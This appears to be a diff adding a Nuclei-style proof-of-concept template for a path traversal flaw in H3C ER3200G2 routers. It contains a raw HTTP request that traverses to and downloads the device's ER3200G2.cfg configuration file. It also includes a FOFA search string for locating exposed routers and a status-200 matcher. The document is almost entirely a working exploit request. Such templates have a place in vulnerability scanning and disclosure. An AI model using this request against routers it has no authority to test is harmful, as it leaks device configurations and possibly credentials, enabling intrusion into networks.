@@ -1,0 +1,37 @@
+id: poc-gsswaa58u3oslgdw
+info:
+  name: H3C-ER3200G2系列ER3200G2.cfg存在路径穿越导致信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gsswaa58u3oslgdw'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gsswaa58u3oslgdw
+    fofa: app="H3C-Ent-Router" && title=="ER3200G2系统管理"
+http:
+- raw:
+  - 'GET /userLogin.asp/../actionpolicy_status/../ER3200G2.cfg HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Upgrade-Insecure-Requests: 1
+
+    Pragma: no-cache
+
+    Cache-Control: no-cache'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
